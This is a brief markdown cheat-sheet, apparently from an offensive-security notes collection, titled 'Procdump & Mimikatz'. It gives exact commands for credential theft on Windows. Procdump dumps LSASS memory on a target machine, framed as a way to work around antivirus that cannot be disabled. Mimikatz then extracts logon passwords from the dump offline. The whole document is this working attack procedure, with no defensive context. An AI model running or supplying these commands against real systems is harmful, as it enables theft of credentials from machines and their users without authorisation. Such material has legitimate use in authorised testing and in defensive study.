# Procdump & Mimikatz

Useful if AV cannot be disabled and does not block procdump.exe

1. On target machine
    ```batch
    procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
    ```
    
1. Retrieve file

1. On local machine (Windows)
    ```batch
    mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
    ```
